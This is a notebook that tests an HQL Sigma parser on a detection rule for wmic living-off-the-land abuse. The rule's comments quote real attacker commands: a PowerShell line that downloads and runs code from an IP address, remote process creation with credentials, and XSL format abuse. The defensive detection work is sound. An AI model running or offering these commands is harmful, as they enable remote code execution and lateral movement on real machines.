# %%
import Hql.Parser.Sigma as Sigma
from Hql.Config import Config
from Hql.Context import Context
from Hql.Data import Data
from pathlib import Path

# %%
detection = r'''
title: LOLBAS wmic (via cmdline)
id: 9995077f-f56e-4e6b-8f47-d2d210459e57
status: stable
description: Detects use of wmic as a living off the land technique.
references:
    - https://blog.talosintelligence.com/uat-8302/
    - https://www.vmray.com/hydra-saiga-covert-espionage-and-infiltration-of-critical-utilities/
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a
    - https://www.attackiq.com/2025/05/21/response-to-cisa-advisory-aa25-141a
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-050a
    - https://trustedsec.com/blog/command-line-underdog-wmic-in-action
    - https://www.zscaler.com/blogs/security-research/unveiling-revc2-and-venom-loader
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
    - https://www.infosecurity-magazine.com/news/signature-techniques-of-asian-apt/
    - https://www.cybereason.com/blog/research/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers
    - https://www.attackiq.com/2023/07/28/emulating-gallium/
    - https://unit42.paloaltonetworks.com/mallox-ransomware/
    - https://www.securonix.com/securonix-threat-labs-security-advisory-multistorm-leverages-python-based-loader-as-onedrive-utilities-to-drop-rat-payloads/
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a
    - https://blog.sekoia.io/lucky-mouse-incident-response-to-detection-engineering/
    - https://blogs.blackberry.com/en/2022/01/log4u-shell4me
    - https://lolbas-project.github.io/lolbas/Binaries/Wmic/
    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
    - https://www.welivesecurity.com/en/eset-research/lazarus-luring-employees-trojanized-coding-challenges-case-spanish-aerospace-company/
    - https://securityintelligence.com/x-force/gootbot-gootloaders-new-approach-to-post-exploitation/
    - https://www.esentire.com/blog/workersdevbackdoor-delivered-via-malvertising
    - https://www.proofpoint.com/us/blog/threat-insight/security-brief-ta866-returns-large-email-campaign
    - https://blog.talosintelligence.com/new-zardoor-backdoor/
    - https://www.trellix.com/blogs/research/the-evolution-of-the-kuiper-ransomware/
    - https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/
    - https://www.huntress.com/blog/investigating-new-inc-ransom-group-activity
    - https://www.reliaquest.com/blog/blacksuit-attack-analysis/
    - https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive/
    - https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/
    - https://www.esentire.com/blog/more-eggs-activity-persists-via-fake-job-applicant-lures
    - https://thorcert.notion.site/TTPs-11-Operation-An-Octopus-d875862055ca4b7b815b5e496b219671
    - https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/
    - https://news.sophos.com/en-us/2024/09/10/crimson-palace-new-tools-tactics-targets/
    - https://www.trendmicro.com/en_us/research/24/k/breaking-down-earth-estries-persistent-ttps-in-prolonged-cyber-o.html
    - https://thedfirreport.com/2024/12/02/the-curious-case-of-an-egg-cellent-resume/
    - https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/
    - https://www.cloudsek.com/blog/lumma-stealer-chronicles-pdf-themed-campaign-using-compromised-educational-institutions-infrastructure
    - https://thedfirreport.com/2025/03/31/fake-zoom-ends-in-blacksuit-ransomware/
    - https://www.picussecurity.com/resource/blog/dragonforce-ransomware-attacks-retail-giants
    - https://blog.talosintelligence.com/talos-ir-ransomware-engagements-and-the-significance-of-timeliness-in-incident-response/
    - https://blog.talosintelligence.com/new-chaos-ransomware/
    - https://blog.talosintelligence.com/uat-7237-targets-web-hosting-infra/
    - https://www.picussecurity.com/resource/blog/xhunt-apt-cyber-espionage-operations-targeting-kuwait-and-exchange-servers
    - https://www.picussecurity.com/resource/blog/apt41-cyber-attacks-history-operations-and-full-ttp-analysis
    - https://www.picussecurity.com/resource/blog/how-wannamine-works-a-fileless-cryptominer-malware
    - https://www.levelblue.com/blogs/spiderlabs-blog/how-clickfix-opens-the-door-to-stealthy-stealc-information-stealer
    - https://detect.fyi/playbook-hunting-chinese-apt-379a6b950492
    - https://research.checkpoint.com/2026/handala-hack-unveiling-groups-modus-operandi/
    - https://gbhackers.com/iran-linked-handala/
author: SOC Prime Team
tags:
    - attack.execution
    - attack.t1047
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith: 'wmic.exe'
    selection_cmdline_1:
        CommandLine|contains:
            - 'node' #wmic /node:172.19.97.102 /user:{redacted}\{redacted} /password:P$ssw0rd0006 process call create "C:\users\Public\COMSysUpdate.exe"; https://www.picussecurity.com/resource/blog/apt41-cyber-attacks-history-operations-and-full-ttp-analysis
            - 'http'
    selection_cmdline_2:
        CommandLine|contains:
            - 'call' #wmic process call create "powershell -c \"iex(iwr 178.16.53.70)\""; https://www.levelblue.com/blogs/spiderlabs-blog/how-clickfix-opens-the-door-to-stealthy-stealc-information-stealer
            - 'brief'
            #- 'delete'
    selection_cmdline_3:
        CommandLine|contains:
            - 'process' #wmic /node:127.0.0.1 process call create cmd
            - 'product' #wmic product where name='Tum' call uninstall /nointeractive
    selection_cmdline_4_xsl:
        CommandLine|contains|all:
            - 'brief'
            - 'format'
            - '.xsl' #process get brief /format:"c:\\temp\\demo.xsl"
    filters:
        - CommandLine|endswith:
            - 'GetOwner' #wmic /record:C:\Users\xxx\AppData\Local\Temp\nsh77D8.tmp process where (name="iexplore.exe") Call GetOwner
            - ' uninstall'
        - CommandLine|contains:
            - 'where ID="'
            - "where ID='"
            - ' call Activate' #license management
            - ' call InstallProductKey ' #license management
            - 'CALL TERMINATE' #"C:\Windows\System32\wbem\WMIC.exe" PROCESS WHERE "Name='pdf24-Reader.exe' AND CommandLine LIKE '%/shellPreview%'" CALL TERMINATE
        - ParentImage|endswith:
            - 'materiallibrarymigrator.exe'
            - 'cswindiag.exe' #crowdstrike
    filters_chain1:
        ParentImage|contains: '\_uninstall' #c:\windows\temp\_uninstall134336aa\_uninstall19532.000
        CommandLine|endswith: 'uninstall' #ex.: WMIC.exe PRODUCT WHERE "Name='Zscaler'" call uninstall
    condition: ((selection_image and selection_cmdline_1) or (selection_image and selection_cmdline_2 and selection_cmdline_3) or (selection_cmdline_3 and selection_image and selection_cmdline_4_xsl)) and not (filters or filters_chain1)
falsepositives:
    - Administrative activity.
level: high
'''

# %%
config = Config(Path('./conf'))
ctx = Context(Data())
sigma = Sigma.SigmaParser(detection, config)
# Out:
# ---------------------------------------------------------------------------
# ConfigException                           Traceback (most recent call last)
# Cell In[3], line 1
# ----> 1 config = Config(Path('./conf'))
#       2 ctx = Context(Data())
#       3 sigma = Sigma.SigmaParser(detection, config)
#
# File ~/git/hql/Hql/Config/__init__.py:22, in Config.__init__(self, path)
#      11 self.conf = {
#      12     'general': {},
#      13     'databases': {},
#    (...)     18     }
#      19 }
#      21 if path:
# ---> 22     self.load(path)
#
# File ~/git/hql/Hql/Config/__init__.py:36, in Config.load(self, path)
#      33         files.append(file)
#      35 for i in files:
# ---> 36     self.load_file(i)
#
# File ~/git/hql/Hql/Config/__init__.py:64, in Config.load_file(self, path)
#      62 elif j == 'product':
#      63     for k in i[j]:
# ---> 64         self.load_product(k, i[j][k], src)
#      66 elif j == 'function':
#      67     self.load_function(src, i[j])
#
# ...

# %%
sigma.assemble()
sigma.assembly

# %%
pipes = sigma.assembly.statements[0].root.pipes
where = pipes[0]

print(type(where.expr.exprs[0].exprs[0]))
print(id(where.expr.exprs[0]))
print(id(where.expr.exprs[0].exprs[0]))

for i in where.expr.exprs:
    print(id(i))
    #print(i)

# %%
print(sigma.assembly.deparse())

# %%
sigma.assembly.preprocess()
print(type(sigma.assembly))

# %%
print(sigma.assembly.deparse())
